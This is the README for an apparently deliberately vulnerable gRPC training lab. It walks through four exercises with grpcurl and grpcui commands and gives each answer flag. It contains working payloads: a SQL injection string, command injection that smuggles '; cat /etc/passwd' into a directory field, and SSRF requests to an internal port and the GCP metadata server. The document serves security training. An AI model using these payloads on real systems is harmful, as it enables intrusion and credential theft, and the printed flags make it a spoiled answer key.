# grpc-goat combined labs

Single gRPC server running labs 001, 007, 008, and 009 on one port. All services are reachable at the same host, differentiated by gRPC service name. Reflection is enabled, so both grpcurl and grpcui will auto-discover all services.

## Prerequisites

Install one or both tools:

- **grpcurl** (CLI): https://github.com/fullstorydev/grpcurl/releases
- **grpcui** (browser UI): `go install github.com/fullstorydev/grpcui/cmd/grpcui@latest`

## Connecting

Replace `<HOST>` throughout this guide with:

| Environment | Host | Notes |
|-------------|------|-------|
| Cloud Run | `your-service-abc123-uc.a.run.app` | TLS, no port needed |
| Local Docker | `localhost:8080` | Add `-plaintext` to all commands |

### grpcui — open the browser UI

```bash
# Cloud Run
grpcui <HOST>

# Local
grpcui -plaintext <HOST>
```

grpcui will open a browser window. Use the **Service** and **Method** dropdowns to select a lab, fill in the request form, and click **Invoke**. All four labs appear in the service list because reflection is enabled.

---

## Lab 001 — gRPC Reflection Enabled

**Vulnerability**: Reflection is enabled, exposing all services and methods including a hidden admin endpoint that returns sensitive data without any authentication.

### grpcurl

```bash
# Discover all services (the vulnerability — this shouldn't be possible)
grpcurl <HOST> list

# Discover methods on ServiceDiscovery
grpcurl <HOST> list servicediscovery.ServiceDiscovery

# Call the public endpoint
grpcurl <HOST> servicediscovery.ServiceDiscovery/ListServices

# Call the hidden admin endpoint — no auth required
grpcurl -d '{}' <HOST> servicediscovery.ServiceDiscovery/AdminListAllServices
```

### grpcui

1. Connect: `grpcui <HOST>`
2. Select service: `servicediscovery.ServiceDiscovery`
3. Select method: `AdminListAllServices`
4. Leave `admin_token` blank and click **Invoke**
5. The flag appears in the response under `flag`

**Flag**: `GRPC_GOAT{reflection_exposes_hidden_admin_methods}`

---

## Lab 007 — SQL Injection

**Vulnerability**: The `username` parameter is interpolated directly into a SQL query with no sanitisation.

### grpcurl

```bash
# Normal lookup
grpcurl -d '{"username": "john"}' <HOST> userdirectory.UserDirectory/SearchUsers

# SQL injection to dump all rows
grpcurl -d '{"username": "x'\'' OR '\''1'\''='\''1"}' <HOST> userdirectory.UserDirectory/SearchUsers

# Direct lookup of the flag user
grpcurl -d '{"username": "flag_user"}' <HOST> userdirectory.UserDirectory/SearchUsers
```

### grpcui

1. Connect: `grpcui <HOST>`
2. Select service: `userdirectory.UserDirectory`, method: `SearchUsers`
3. Set `username` to `x' OR '1'='1` (the form handles quoting for you)
4. Click **Invoke** — all users including the flag user are returned

**Flag**: `GRPC_GOAT{sql_injection_data_exfiltration}`

---

## Lab 008 — Command Injection

**Vulnerability**: The `directory` parameter is passed directly to `sh -c "ls -la <input>"`, allowing arbitrary command execution.

### grpcurl

```bash
# Normal usage
grpcurl -d '{"directory": "/tmp"}' <HOST> fileprocessor.FileProcessor/ListFiles

# Inject a second command
grpcurl -d '{"directory": "/tmp; id"}' <HOST> fileprocessor.FileProcessor/ListFiles

# Read /etc/passwd
grpcurl -d '{"directory": "/tmp; cat /etc/passwd"}' <HOST> fileprocessor.FileProcessor/ListFiles

# Read the flag file
grpcurl -d '{"directory": "/tmp; cat /flag.txt"}' <HOST> fileprocessor.FileProcessor/ListFiles
```

### grpcui

1. Connect: `grpcui <HOST>`
2. Select service: `fileprocessor.FileProcessor`, method: `ListFiles`
3. Set `directory` to `/tmp; cat /etc/passwd`
4. Click **Invoke** — the injected command output appears in `output`

**Flag**: `GRPC_GOAT{command_injection_file_listing}`

---

## Lab 009 — SSRF

**Vulnerability**: The `url` parameter is fetched server-side with no validation, allowing access to internal services unreachable from the outside.

An internal HTTP server runs on `localhost:9090` inside the container. It is not exposed externally but is reachable by the gRPC service when you supply it as the URL.

### grpcurl

```bash
# Normal usage
grpcurl -d '{"url": "https://example.com"}' <HOST> imagepreview.ImagePreview/FetchImage

# SSRF to the internal flag server
grpcurl -d '{"url": "http://localhost:9090/flag"}' <HOST> imagepreview.ImagePreview/FetchImage

# On GCP — probe the metadata server
grpcurl -d '{"url": "http://metadata.google.internal/computeMetadata/v1/"}' <HOST> imagepreview.ImagePreview/FetchImage
```

### grpcui

1. Connect: `grpcui <HOST>`
2. Select service: `imagepreview.ImagePreview`, method: `FetchImage`
3. Set `url` to `http://localhost:9090/flag`
4. Click **Invoke** — the flag is returned in `content`

**Flag**: `GRPC_GOAT{ssrf_internal_service_access}`

---

## Local development

```bash
docker build -t grpc-goat-combined .
docker run -p 8080:8080 grpc-goat-combined

# CLI
grpcurl -plaintext localhost:8080 list

# Browser UI
grpcui -plaintext localhost:8080
```

## Deploy to Cloud Run

```powershell
.\deploy-cloudrun.ps1 -ProjectId your-project-id
```

## Tear down

```powershell
.\teardown-cloudrun.ps1 -ProjectId your-project-id
```
